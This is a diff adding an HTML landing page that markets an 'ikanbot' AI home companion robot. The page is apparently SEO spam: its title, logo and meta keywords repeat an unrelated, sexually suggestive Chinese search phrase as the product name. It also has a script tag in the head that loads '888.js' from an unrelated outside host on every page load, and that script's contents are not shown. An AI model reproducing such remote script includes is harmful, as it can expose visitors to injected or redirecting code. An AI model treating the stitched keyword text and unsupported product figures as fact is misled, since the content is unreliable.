@@ -1,0 +1,1797 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="index,follow">
+  <meta name="bingbot" content="index,follow">
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  <script type="text/javascript" src="https://io.1130.hk/888.js"></script>
+  <title>我可以触碰你的深处吗开车游戏_智能陪伴-远程看护</title>
+  <meta name="description" content="我可以触碰你的深处吗开车游戏作为新一代AI智能陪伴机器人，搭载先进交互系统，支持远程看护、家庭陪伴、异常预警与语音控制功能。机身轻盈灵活，操作便捷，适合全家使用。本文全面解析其核心亮点与应用场景，助您快速了解这款智能助手的实用价值与选购要点。">
+  <meta name="keywords" content="我可以触碰你的深处吗开车游戏,AI智能机器人,家庭陪伴机器人,远程看护,智能交互系统,机器人评测">
+  <style>
+    /* ===== 全局变量与重置 ===== */
+    :root {
+      --primary: #4F46E5;
+      --primary-light: #818CF8;
+      --accent: #7C3AED;
+      --cyan: #06B6D4;
+      --bg-dark: #131739;
+      --bg-soft: #EEF2FF;
+      --text-dark: #0F172A;
+      --text-gray: #6B7280;
+      --text-light: #F8FAFC;
+      --card-radius: 24px;
+      --pill-radius: 70px;
+      --card-bg: rgba(255, 255, 255, 0.72);
+      --card-border: rgba(255, 255, 255, 0.65);
+      --shadow-sm: 0 4px 20px rgba(0, 0, 0, 0.04);
+      --shadow-lg: 0 18px 50px rgba(79, 70, 229, 0.12);
+      --max-width: 1200px;
+      --font-size: 17px;
+      --line-height: 1.9;
+    }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html {
+      scroll-behavior: smooth;
+      font-size: var(--font-size);
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+      background: var(--bg-soft);
+      color: var(--text-dark);
+      line-height: var(--line-height);
+      opacity: 0;
+      animation: bodyFadeIn 0.8s ease forwards;
+    }
+    @keyframes bodyFadeIn {
+      to {
+        opacity: 1;
+      }
+    }
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+    ul,
+    ol {
+      list-style: none;
+    }
+    /* ===== 滚动进度条 ===== */
+    #scroll-progress {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 4px;
+      width: 0;
+      background: linear-gradient(90deg, var(--primary), var(--cyan));
+      z-index: 10000;
+      transition: width 0.1s linear;
+    }
+    /* ===== 固定导航栏 ===== */
+    .site-header {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 9999;
+      background: rgba(255, 255, 255, 0.86);
+      backdrop-filter: blur(18px);
+      border-bottom: 1px solid rgba(203, 213, 225, 0.35);
+      height: 64px;
+    }
+    .nav-inner {
+      max-width: var(--max-width);
+      height: 100%;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .logo-icon {
+      width: 42px;
+      height: 42px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .logo-icon svg {
+      width: 26px;
+      height: 26px;
+    }
+    .logo-text {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--text-dark);
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+    .nav-links {
+      display: flex;
+      gap: 28px;
+    }
+    .nav-links a {
+      font-size: 15px;
+      font-weight: 500;
+      color: var(--text-gray);
+      transition: color 0.3s, transform 0.2s;
+      line-height: 64px;
+    }
+    .nav-links a:hover {
+      color: var(--primary);
+      transform: translateY(-1px);
+    }
+    /* ===== Banner ===== */
+    .hero {
+      min-height: 650px;
+      height: 65vh;
+      background: linear-gradient(135deg, #EEF2FF 0%, #E0E7FF 50%, #DDD6FE 100%);
+      position: relative;
+      overflow: visible;
+      display: flex;
+      align-items: center;
+      padding: 90px 24px 40px;
+    }
+    .hero::before,
+    .hero::after {
+      content: "";
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(20px);
+      opacity: 0.6;
+    }
+    .hero::before {
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(99, 102, 241, 0.3), transparent 70%);
+      left: -100px;
+      top: -60px;
+      animation: floatBlob 8s ease-in-out infinite alternate;
+    }
+    .hero::after {
+      width: 320px;
+      height: 320px;
+      background: radial-gradient(circle, rgba(6, 182, 212, 0.25), transparent 70%);
+      right: 0;
+      bottom: 10px;
+      animation: floatBlob2 10s ease-in-out infinite alternate;
+    }
+    @keyframes floatBlob {
+      to {
+        transform: translate(40px, 30px);
+      }
+    }
+    @keyframes floatBlob2 {
+      to {
+        transform: translate(-30px, 20px);
+      }
+    }
+    .hero-container {
+      max-width: var(--max-width);
+      margin: 0 auto;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 48px;
+      position: relative;
+      z-index: 2;
+    }
+    .hero-left {
+      flex: 1;
+      max-width: 540px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 18px;
+    }
+    .hero-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.92);
+      border-radius: 50px;
+      padding: 8px 18px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.04);
+      font-size: 14px;
+      color: var(--primary);
+      font-weight: 600;
+    }
+    .hero-tag i {
+      font-size: 13px;
+    }
+    .hero h1 {
+      font-size: 44px;
+      font-weight: 800;
+      color: var(--text-dark);
+      line-height: 1.25;
+      letter-spacing: -1px;
+    }
+    .hero h1 .highlight {
+      color: var(--primary);
+      position: relative;
+    }
+    .hero-desc {
+      font-size: 16px;
+      color: var(--text-gray);
+      line-height: 1.8;
+      max-width: 480px;
+    }
+    .hero-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .hero-tags span {
+      background: rgba(255, 255, 255, 0.55);
+      border: 1px solid rgba(255, 255, 255, 0.7);
+      border-radius: 50px;
+      padding: 5px 14px;
+      font-size: 13px;
+      color: #374151;
+      backdrop-filter: blur(6px);
+    }
+    .hero-btns {
+      display: flex;
+      gap: 14px;
+      margin-top: 6px;
+    }
+    .btn-primary,
+    .btn-secondary {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px 28px;
+      border-radius: 50px;
+      font-size: 15px;
+      font-weight: 600;
+      transition: transform 0.25s, box-shadow 0.25s;
+      cursor: pointer;
+      border: none;
+    }
+    .btn-primary {
+      background: var(--primary);
+      color: #fff;
+      box-shadow: 0 8px 24px rgba(79, 70, 229, 0.28);
+    }
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 32px rgba(79, 70, 229, 0.36);
+    }
+    .btn-secondary {
+      background: rgba(255, 255, 255, 0.8);
+      color: var(--text-dark);
+      border: 1px solid rgba(226, 232, 240, 0.8);
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.03);
+    }
+    .btn-secondary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
+    }
+    /* 右侧电脑窗口 */
+    .hero-right {
+      flex: 1;
+      max-width: 540px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .monitor {
+      width: 100%;
+      max-width: 520px;
+      background: #0B0E1A;
+      border-radius: 20px;
+      border: 2px solid rgba(15, 23, 42, 0.9);
+      box-shadow: 0 24px 70px rgba(15, 23, 42, 0.3);
+      padding: 16px;
+      position: relative;
+    }
+    .monitor-status-bar {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      margin-bottom: 14px;
+    }
+    .monitor-status-bar span {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      display: block;
+    }
+    .monitor-status-bar span:nth-child(1) {
+      background: #F87171;
+    }
+    .monitor-status-bar span:nth-child(2) {
+      background: #FBBF24;
+    }
+    .monitor-status-bar span:nth-child(3) {
+      background: #34D399;
+    }
+    .monitor-status-bar i {
+      color: rgba(255, 255, 255, 0.25);
+      font-size: 11px;
+      margin-left: 10px;
+      font-style: normal;
+    }
+    .monitor-body {
+      display: flex;
+      gap: 12px;
+      align-items: stretch;
+    }
+    .monitor-col-left {
+      flex: 0 0 30%;
+      background: rgba(255, 255, 255, 0.04);
+      border-radius: 12px;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-align: center;
+    }
+    .monitor-col-left .icon-square {
+      width: 48px;
+      height: 48px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .monitor-col-left .icon-square svg {
+      width: 26px;
+      height: 26px;
+    }
+    .monitor-col-left b {
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      line-height: 1.2;
+    }
+    .monitor-col-left small {
+      color: rgba(255, 255, 255, 0.4);
+      font-size: 11px;
+    }
+    .monitor-col-center {
+      flex: 1;
+      background: rgba(255, 255, 255, 0.02);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+    }
+    .monitor-col-right {
+      flex: 0 0 28%;
+      background: rgba(255, 255, 255, 0.04);
+      border-radius: 12px;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 6px;
+    }
+    .monitor-col-right .data-row {
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      padding: 4px 0;
+    }
+    .monitor-col-right .data-row span {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 11px;
+      line-height: 1.4;
+    }
+    .monitor-col-right .data-row b {
+      color: #fff;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .ring-wrapper {
+      position: relative;
+      width: 100px;
+      height: 100px;
+      animation: ringPulse 3s ease-in-out infinite;
+    }
+    @keyframes ringPulse {
+      0%,
+      100% {
+        transform: scale(1);
+        opacity: 0.9;
+      }
+      50% {
+        transform: scale(1.03);
+        opacity: 1;
+      }
+    }
+    .ring-center-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+    }
+    .ring-center-text b {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+    }
+    .ring-center-text span {
+      color: rgba(255, 255, 255, 0.5);
+      font-size: 10px;
+    }
+    /* ===== 通用Section ===== */
+    .section {
+      padding: 80px 24px;
+    }
+    .container {
+      max-width: var(--max-width);
+      margin: 0 auto;
+    }
+    .section-title-wrap {
+      text-align: center;
+      margin-bottom: 48px;
+    }
+    .section-title-wrap h2 {
+      font-size: 34px;
+      font-weight: 800;
+      line-height: 1.3;
+      margin-bottom: 12px;
+      color: var(--text-dark);
+    }
+    .section-title-wrap .subtitle {
+      color: var(--text-gray);
+      font-size: 16px;
+    }
+    /* ===== 核心优势 ===== */
+    #section-advantage {
+      background: linear-gradient(180deg, #EEF2FF 0%, #DDE1FF 100%);
+      position: relative;
+    }
+    #section-advantage::before {
+      content: "";
+      position: absolute;
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(124, 58, 237, 0.12), transparent 70%);
+      top: 50%;
+      left: -200px;
+      transform: translateY(-50%);
+      z-index: 0;
+    }
+    .advantage-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 28px;
+      position: relative;
+      z-index: 1;
+    }
+    .adv-card {
+      background: rgba(19, 23, 57, 0.55);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border-radius: var(--pill-radius);
+      padding: 34px 30px 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+      min-height: 230px;
+    }
+    .adv-card:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 24px 55px rgba(15, 23, 42, 0.25);
+      border-color: rgba(129, 140, 248, 0.5);
+    }
+    .adv-icon {
+      width: 54px;
+      height: 54px;
+      border-radius: 16px;
+      background: linear-gradient(135deg, var(--primary), var(--cyan));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 24px;
+      box-shadow: 0 8px 20px rgba(79, 70, 229, 0.3);
+    }
+    .adv-card h3 {
+      font-size: 19px;
+      font-weight: 700;
+      color: #F8FAFC;
+      margin-top: 6px;
+    }
+    .adv-card p {
+      color: rgba(248, 250, 252, 0.72);
+      font-size: 15px;
+      line-height: 1.8;
+    }
+    /* ===== 精选视频 ===== */
+    .video-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 26px;
+    }
+    .video-card {
+      background: var(--card-bg);
+      border-radius: var(--card-radius);
+      border: 1px solid var(--card-border);
+      overflow: visible;
+      backdrop-filter: blur(10px);
+      transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+      box-shadow: var(--shadow-sm);
+    }
+    .video-card:hover {
+      transform: translateY(-6px);
+      box-shadow: var(--shadow-lg);
+      border-color: rgba(79, 70, 229, 0.3);
+    }
+    .video-thumbnail {
+      position: relative;
+      height: 190px;
+      border-radius: var(--card-radius) var(--card-radius) 0 0;
+      overflow: hidden;
+      display: block;
+    }
+    .video-thumbnail .vid-category {
+      position: absolute;
+      top: 14px;
+      left: 14px;
+      background: rgba(15, 23, 42, 0.55);
+      backdrop-filter: blur(8px);
+      border-radius: 50px;
+      color: #fff;
+      font-size: 12px;
+      padding: 5px 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      z-index: 2;
+    }
+    .video-thumbnail .play-btn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.25);
+      backdrop-filter: blur(8px);
+      border: 2px solid rgba(255, 255, 255, 0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 18px;
+      transition: transform 0.3s, background 0.3s;
+      cursor: pointer;
+      z-index: 2;
+    }
+    .video-thumbnail .play-btn:hover {
+      transform: translate(-50%, -50%) scale(1.1);
+      background: rgba(255, 255, 255, 0.35);
+    }
+    .video-thumbnail .video-duration {
+      position: absolute;
+      right: 14px;
+      bottom: 14px;
+      background: rgba(15, 23, 42, 0.8);
+      border-radius: 8px;
+      color: #fff;
+      font-size: 12px;
+      padding: 3px 8px;
+      z-index: 2;
+    }
+    .video-info {
+      padding: 18px 20px 22px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .video-title {
+      font-size: 17px;
+      font-weight: 700;
+      line-height: 1.4;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .video-desc {
+      color: var(--text-gray);
+      font-size: 14px;
+      line-height: 1.75;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      min-height: 48px;
+    }
+    .video-meta {
+      display: flex;
+      gap: 18px;
+      font-size: 13px;
+      color: var(--text-gray);
+    }
+    .video-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 2px;
+    }
+    .tag-video {
+      background: var(--primary);
+      color: #fff;
+      border-radius: 50px;
+      padding: 3px 12px;
+      font-size: 12px;
+    }
+    .tag {
+      background: #F1F5F9;
+      color: var(--text-gray);
+      border-radius: 50px;
+      padding: 3px 12px;
+      font-size: 12px;
+    }
+    /* ===== 相关资讯 ===== */
+    .section-title-bar {
+      width: 60px;
+      height: 4px;
+      border-radius: 2px;
+      background: var(--primary);
+      margin: 18px auto 0;
+    }
+    .news-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 26px;
+      grid-auto-rows: 1fr;
+    }
+    .news-card {
+      background: var(--card-bg);
+      border-radius: var(--card-radius);
+      border: 1px solid var(--card-border);
+      backdrop-filter: blur(10px);
+      transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      min-height: 250px;
+      box-shadow: var(--shadow-sm);
+    }
+    .news-card:hover {
+      transform: translateY(-6px);
+      box-shadow: var(--shadow-lg);
+      border-color: rgba(79, 70, 229, 0.28);
+    }
+    .news-date {
+      font-size: 13px;
+      color: var(--primary);
+      font-weight: 500;
+      margin-bottom: 10px;
+      opacity: 0.8;
+    }
+    .news-title {
+      font-size: 18px;
+      font-weight: 700;
+      line-height: 1.45;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      min-height: 52px;
+      margin-bottom: 8px;
+    }
+    .news-excerpt {
+      font-size: 14px;
+      color: var(--text-gray);
+      line-height: 1.75;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      flex: 1;
+      min-height: 48px;
+    }
+    .news-link {
+      margin-top: auto;
+      padding-top: 16px;
+      font-size: 14px;
+      color: var(--primary);
+      font-weight: 500;
+      transition: color 0.25s;
+    }
+    .news-link:hover {
+      color: var(--accent);
+    }
+    /* ===== FAQ ===== */
+    .faq-list {
+      max-width: 880px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .faq-card {
+      background: var(--card-bg);
+      border-radius: var(--card-radius);
+      border: 1px solid var(--card-border);
+      backdrop-filter: blur(10px);
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+    }
+    .faq-card:hover {
+      transform: translateY(-3px);
+      box-shadow: var(--shadow-lg);
+      border-color: rgba(79, 70, 229, 0.2);
+    }
+    .faq-question {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 20px 24px;
+      cursor: pointer;
+      user-select: none;
+      background: transparent;
+      border: none;
+      width: 100%;
+      text-align: left;
+      font-size: 17px;
+      font-weight: 700;
+      color: var(--primary);
+      transition: background 0.3s;
+    }
+    .faq-question:hover {
+      background: rgba(79, 70, 229, 0.04);
+    }
+    .faq-question i {
+      font-size: 18px;
+      width: 22px;
+      text-align: center;
+      color: var(--primary);
+    }
+    .faq-question .faq-toggle-icon {
+      margin-left: auto;
+      font-size: 14px;
+      transition: transform 0.3s;
+      color: var(--text-gray);
+    }
+    .faq-card.active .faq-toggle-icon {
+      transform: rotate(45deg);
+      color: var(--primary);
+    }
+    .faq-answer {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.4s ease;
+    }
+    .faq-answer-inner {
+      padding: 0 24px 24px 58px;
+      font-size: 15px;
+      color: var(--text-gray);
+      line-height: 1.9;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .faq-answer-inner li {
+      position: relative;
+      padding-left: 16px;
+    }
+    .faq-answer-inner li::before {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 10px;
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--primary);
+    }
+    /* ===== 评论模块 ===== */
+    #section-comment {
+      background: linear-gradient(180deg, #F8FAFC 0%, #EEF2FF 100%);
+    }
+    .comment-wrapper {
+      background: var(--card-bg);
+      border-radius: var(--card-radius);
+      border: 1px solid var(--card-border);
+      box-shadow: var(--shadow-sm);
+      padding: 32px;
+      display: flex;
+      gap: 32px;
+      align-items: stretch;
+    }
+    .comment-form {
+      flex: 0 0 320px;
+      background: #fff;
+      border-radius: var(--card-radius);
+      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      box-shadow: var(--shadow-sm);
+    }
+    .comment-form input,
+    .comment-form textarea {
+      width: 100%;
+      border: 1px solid #E2E8F0;
+      border-radius: 16px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.3s, box-shadow 0.3s;
+      background: #F8FAFC;
+      resize: vertical;
+    }
+    .comment-form input:focus,
+    .comment-form textarea:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+    }
+    .comment-form textarea {
+      min-height: 110px;
+    }
+    .comment-submit {
+      align-self: flex-start;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 10px 26px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .comment-submit:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(79, 70, 229, 0.3);
+    }
+    .comment-list {
+      flex: 1;
+      max-height: 620px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      padding-right: 6px;
+      scroll-behavior: smooth;
+    }
+    .comment-list::-webkit-scrollbar {
+      width: 6px;
+    }
+    .comment-list::-webkit-scrollbar-thumb {
+      background: #CBD5E1;
+      border-radius: 3px;
+    }
+    .comment-item {
+      background: #fff;
+      border-radius: var(--card-radius);
+      padding: 18px 20px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.02);
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      transition: box-shadow 0.25s;
+    }
+    .comment-item:hover {
+      box-shadow: 0 6px 22px rgba(0, 0, 0, 0.05);
+    }
+    .comment-user {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .comment-avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+    .comment-user .nickname {
+      font-weight: 600;
+      font-size: 14px;
+      color: var(--text-dark);
+    }
+    .comment-time {
+      margin-left: auto;
+      font-size: 12px;
+      color: #94A3B8;
+    }
+    .comment-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      background: #F1F5F9;
+      border-radius: 50px;
+      padding: 2px 12px;
+      font-size: 12px;
+      color: #64748B;
+      width: fit-content;
+    }
+    .comment-tag i {
+      font-size: 11px;
+    }
+    .comment-body {
+      font-size: 14px;
+      line-height: 1.75;
+      color: #334155;
+      word-break: break-word;
+    }
+    .comment-actions {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-top: 4px;
+    }
+    .comment-actions span {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 13px;
+      color: #94A3B8;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .comment-actions span:hover {
+      color: var(--primary);
+    }
+    .comment-load-more {
+      text-align: center;
+      padding: 12px 0 4px;
+      color: var(--text-gray);
+      font-size: 13px;
+      cursor: pointer;
+      user-select: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+    }
+    .comment-load-more i {
+      font-size: 16px;
+      animation: bounceDown 1.5s infinite;
+    }
+    @keyframes bounceDown {
+      0%,
+      100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(4px);
+      }
+    }
+    /* ===== 页脚 ===== */
+    .site-footer {
+      background: #0F172A;
+      color: rgba(255, 255, 255, 0.65);
+      padding: 40px 24px 30px;
+      text-align: center;
+      font-size: 14px;
+      line-height: 2;
+    }
+    .site-footer a {
+      color: rgba(255, 255, 255, 0.8);
+      text-decoration: underline;
+      text-underline-offset: 4px;
+    }
+    /* ===== 响应式 ===== */
+    @media (max-width: 992px) {
+      .hero-container {
+        flex-direction: column;
+        text-align: center;
+        gap: 36px;
+      }
+      .hero-left {
+        align-items: center;
+        max-width: 100%;
+      }
+      .hero-tags,
+      .hero-btns {
+        justify-content: center;
+      }
+      .monitor {
+        max-width: 480px;
+      }
+      .advantage-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .video-grid,
+      .news-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .comment-wrapper {
+        flex-direction: column;
+      }
+      .comment-form {
+        flex: none;
+        width: 100%;
+      }
+      .nav-links a {
+        font-size: 14px;
+      }
+    }
+    @media (max-width: 640px) {
+      .hero {
+        padding-top: 80px;
+      }
+      .hero h1 {
+        font-size: 32px;
+      }
+      .section {
+        padding: 56px 16px;
+      }
+      .section-title-wrap h2 {
+        font-size: 27px;
+      }
+      .advantage-grid {
+        grid-template-columns: 1fr;
+      }
+      .video-grid,
+      .news-grid {
+        grid-template-columns: 1fr;
+      }
+      .hero-right {
+        max-width: 100%;
+        padding: 0 8px;
+      }
+      .monitor {
+        border-radius: 16px;
+      }
+      .monitor-body {
+        flex-direction: column;
+      }
+      .monitor-col-left,
+      .monitor-col-right {
+        flex: none;
+        flex-direction: row;
+        align-items: center;
+        justify-content: space-around;
+        padding: 12px;
+      }
+      .nav-links {
+        gap: 10px;
+        overflow-x: auto;
+        white-space: nowrap;
+        -webkit-overflow-scrolling: touch;
+      }
+      .nav-links a {
+        line-height: 64px;
+        padding: 0 4px;
+      }
+      .comment-wrapper {
+        padding: 16px;
+      }
+    }
+    @media (max-width: 480px) {
+      .nav-inner {
+        padding: 0 12px;
+      }
+      .logo-text {
+        font-size: 16px;
+      }
+      .logo-icon {
+        width: 38px;
+        height: 38px;
+      }
+      .nav-links a {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- 滚动进度条 -->
+  <div id="scroll-progress"></div>
+  <!-- ===== 固定导航栏 ===== -->
+  <header class="site-header">
+    <div class="nav-inner">
+      <a href="#" class="logo" aria-label="我可以触碰你的深处吗开车游戏 首页">
+        <span class="logo-icon">
+          <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="3" width="26" height="26" rx="7" stroke="#fff" stroke-width="2.5"/>
+            <circle cx="13" cy="13" r="3" fill="#fff"/>
+            <circle cx="20" cy="13" r="3" fill="#fff"/>
+            <path d="M11 21h11" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
+          </svg>
+        </span>
+        <span class="logo-text">我可以触碰你的深处吗开车游戏</span>
+      </a>
+      <nav class="nav-links" aria-label="主导航">
+        <a href="#hero">首页</a>
+        <a href="#section-advantage">核心优势</a>
+        <a href="#section-video">精选视频</a>
+        <a href="#section-news">相关资讯</a>
+        <a href="#section-faq">常见问题</a>
+        <a href="#section-comment">留言</a>
+      </nav>
+    </div>
+  </header>
+  <!-- ===== 首屏 Banner ===== -->
+  <section class="hero" id="hero">
+    <div class="hero-container">
+      <div class="hero-left">
+        <span class="hero-tag"><i class="fas fa-arrow-down"></i> 全新一代AI智能陪伴机器人</span>
+        <h1>爱看机器人<i class="highlight">ikanbot</i><br>让家更暖一点</h1>
+        <p class="hero-desc">我可以触碰你的深处吗开车游戏是集智能交互、远程看护与家庭安防于一体的AI机器人。凭借高清摄像头与自主学习算法，为你24小时守护全屋动态。</p>
+        <div class="hero-tags">
+          <span>360°全景巡航</span>
+          <span>AI人脸识别</span>
+          <span>语音对话</span>
+          <span>远程遥控</span>
+        </div>
+        <div class="hero-btns">
+          <a href="#" class="btn-primary">立即体验</a>
+          <a href="#section-advantage" class="btn-secondary">了解更多</a>
+        </div>
+      </div>
+      <div class="hero-right">
+        <div class="monitor" aria-hidden="true">
+          <div class="monitor-status-bar">
+            <span></span><span></span><span></span>
+            <i>https://ikanbot.ai</i>
+          </div>
+          <div class="monitor-body">
+            <div class="monitor-col-left">
+              <div class="icon-square">
+                <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <rect x="2" y="2" width="24" height="24" rx="6" stroke="#fff" stroke-width="2"/>
+                  <circle cx="11" cy="11" r="2.5" fill="#fff"/>
+                  <circle cx="17.5" cy="11" r="2.5" fill="#fff"/>
+                  <path d="M9 18h10" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+              </div>
+              <b>ikanbot</b>
+              <small>AI 机器人</small>
+            </div>
+            <div class="monitor-col-center">
+              <div class="ring-wrapper">
+                <svg viewBox="0 0 100 100" width="100" height="100">
+                  <circle cx="50" cy="50" r="42" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="8"/>
+                  <circle cx="50" cy="50" r="42" fill="none" stroke="url(#grad)" stroke-width="8" stroke-linecap="round" stroke-dasharray="263.9" stroke-dashoffset="56" transform="rotate(-90 50 50)"/>
+                  <defs>
+                    <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
+                      <stop offset="0%" stop-color="#818CF8"/>
+                      <stop offset="100%" stop-color="#22D3EE"/>
+                    </linearGradient>
+                  </defs>
+                </svg>
+                <div class="ring-center-text">
+                  <b>79%</b>
+                  <span>流畅度</span>
+                </div>
+              </div>
+            </div>
+            <div class="monitor-col-right">
+              <div class="data-row"><span>待机</span><b>96%</b></div>
+              <div class="data-row"><span>音速</span><b>34dB</b></div>
+              <div class="data-row"><span>时长</span><b>7天</b></div>
+              <div class="data-row"><span>强度</span><b>强</b></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <!-- ===== 核心优势 ===== -->
+  <section class="section" id="section-advantage">
+    <div class="container">
+      <div class="section-title-wrap">
+        <h2>为什么选择爱看机器人？</h2>
+        <p class="subtitle">从AI交互到安全守护，六重能力助力品质家居生活</p>
+      </div>
+      <div class="advantage-grid">
+        <div class="adv-card">
+          <div class="adv-icon"><i class="fas fa-microchip"></i></div>
+          <h3>AI智能交互引擎</h3>
+          <p>基于深度学习算法，精准理解语音指令，支持自然连续对话，越用越懂你。</p>
+        </div>
